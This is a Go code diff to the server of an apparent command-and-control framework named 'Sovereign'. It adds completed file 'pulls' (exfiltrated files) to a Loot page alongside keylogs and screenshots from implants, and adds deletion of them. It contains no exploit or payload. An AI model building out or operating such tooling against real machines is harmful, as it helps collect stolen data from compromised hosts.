@@ -1,9 +1,12 @@
 package server
 
 import (
+	"fmt"
+	"log/slog"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
 
@@ -21,15 +24,19 @@ type lootScreenshotDTO struct {
 }
 
 type lootTaskDTO struct {
-	ID        uint      `json:"id"`
-	AgentID   string    `json:"agent_id"`
-	Hostname  string    `json:"hostname"`
-	Type      string    `json:"type"`
-	Command   string    `json:"command"`
-	Result    string    `json:"result"`
-	Error     string    `json:"error"`
-	Status    string    `json:"status"`
-	CreatedAt time.Time `json:"created_at"`
+	ID         uint      `json:"id"`
+	AgentID    string    `json:"agent_id"`
+	Hostname   string    `json:"hostname"`
+	Type       string    `json:"type"`
+	Command    string    `json:"command"`
+	Result     string    `json:"result"`
+	Error      string    `json:"error"`
+	Status     string    `json:"status"`
+	CreatedAt  time.Time `json:"created_at"`
+	TransferID *uint     `json:"transfer_id,omitempty"`
+	Filename   string    `json:"filename,omitempty"`
+	SHA256     string    `json:"sha256,omitempty"`
+	Size       int64     `json:"size,omitempty"`
 }
 
 func newLootScreenshot(agentID, filename string, mod time.Time) lootScreenshotDTO {
@@ -47,15 +54,16 @@ func newLootScreenshot(agentID, filename string, mod time.Time) lootScreenshotDT
 
 func newLootTask(t db.Task) lootTaskDTO {
 	return lootTaskDTO{
-		ID:        t.ID,
-		AgentID:   t.AgentID,
-		Hostname:  t.Agent.Hostname,
-		Type:      t.Type,
-		Command:   t.Command,
-		Result:    t.Result,
-		Error:     t.Error,
-		Status:    t.Status,
-		CreatedAt: t.CreatedAt,
+		ID:         t.ID,
+		AgentID:    t.AgentID,
+		Hostname:   t.Agent.Hostname,
+		Type:       t.Type,
+		Command:    t.Command,
+		Result:     t.Result,
+		Error:      t.Error,
+		Status:     t.Status,
+		CreatedAt:  t.CreatedAt,
+		TransferID: t.TransferID,
 	}
 }
 
@@ -144,25 +152,45 @@ func (s *Server) handleLootPage(c *gin.Context) {
 		return
 	}
 
-	// Recent file pulls. Exfil is type=upload with no push payload.
-	// download_url is the implant fetching a URL onto its own disk — not a teamserver blob.
+	// Historical URL-fetch/metadata rows stay visible, but durable transfer
+	// chunk tasks are represented only by their completed session below.
 	var downloadTasks []db.Task
-	downloadQ := s.db.Preload("Agent", func(db *gorm.DB) *gorm.DB { return db.Select("id", "hostname") }).
-		Where("(type = ? AND (data = '' OR data IS NULL)) OR type = ?", "upload", "download")
+	downloadQ := s.db.Preload("Agent", func(db *gorm.DB) *gorm.DB { return db.Select("id, hostname") }).
+		Where("transfer_id IS NULL AND ((type = ? AND (data = '' OR data IS NULL)) OR type = ?)", "upload", "download")
 	downloadQ = s.tenantScope(downloadQ, c)
 	if err := downloadQ.
 		Order("created_at desc").Limit(50).Find(&downloadTasks).Error; err != nil {
 		handleQueryError(c, err, "Failed to query download tasks")
 		return
 	}
+	// Durable pull sessions are the authoritative exfil record. Include
+	// completed ones so a file that a transfer task fetched does not vanish
+	// from Loot once the legacy task row stops carrying the blob.
+	var completedPulls []db.FileTransfer
+	pullQ := s.tenantScope(s.db.Model(&db.FileTransfer{}), c).
+		Where("direction = ? AND status = ?", "pull", "completed")
+	if err := pullQ.Order("completed_at DESC").Limit(50).Find(&completedPulls).Error; err != nil {
+		slog.Warn("Failed to list completed file transfers", "err", err)
+	}
+	transferRows := make([]lootTaskDTO, 0, len(completedPulls))
+	for _, ft := range completedPulls {
+		transferID := ft.ID
+		transferRows = append(transferRows, lootTaskDTO{
+			ID: ft.ID, AgentID: ft.AgentID, Type: "pull", Command: ft.RemotePath,
+			Result: fmt.Sprintf("(%d bytes)", ft.CommittedOffset), Status: "completed",
+			CreatedAt: ft.CreatedAt, TransferID: &transferID,
+			Filename: ft.Filename, SHA256: ft.SHA256, Size: ft.CommittedOffset,
+		})
+	}
 
 	stats := s.getNavStats(c)
 	data := gin.H{
-		"Title":         "Sovereign - Loot",
-		"ActiveNav":     "loot",
-		"Screenshots":   allScreenshots,
-		"KeylogTasks":   mapLootTasks(keylogTasks),
-		"DownloadTasks": mapLootTasks(downloadTasks),
+		"Title":              "Sovereign - Loot",
+		"ActiveNav":          "loot",
+		"Screenshots":        allScreenshots,
+		"KeylogTasks":        mapLootTasks(keylogTasks),
+		"DownloadTasks":      mapLootTasks(downloadTasks),
+		"CompletedTransfers": transferRows,
 	}
 	for k, v := range stats {
 		data[k] = v
@@ -231,6 +259,31 @@ func (s *Server) handleLootBulkDelete(c *gin.Context) {
 				deleted++
 			}
 		case "download":
+			if strings.HasPrefix(raw, "download:transfer:") {
+				transferID, err := strconv.ParseUint(strings.TrimPrefix(raw, "download:transfer:"), 10, 64)
+				if err != nil || transferID == 0 {
+					continue
+				}
+				var ft db.FileTransfer
+				if err := s.tenantScope(s.db.Model(&db.FileTransfer{}), c).
+					Where("id = ? AND direction = ? AND status = ?", transferID, "pull", "completed").
+					First(&ft).Error; err != nil {
+					continue
+				}
+				if dir := s.rawDataDir(); dir != "" {
+					dir = filepath.Join(dir, "transfers")
+					if name, err := validateTransferFilename(ft.Filename, ft.RemotePath); err == nil {
+						_ = os.Remove(transferFinalPath(dir, name, ft.ID))
+					}
+					_ = os.Remove(transferPartPath(dir, ft.ID))
+				}
+				if res := s.tenantScope(s.db.Model(&db.FileTransfer{}), c).
+					Where("id = ? AND direction = ? AND status = ?", ft.ID, "pull", "completed").
+					Delete(&db.FileTransfer{}); res.Error == nil && res.RowsAffected > 0 {
+					deleted++
+				}
+				continue
+			}
 			if s.deleteVisibleLootTask(c, id, []string{"download", "upload"}) {
 				deleted++
 			}
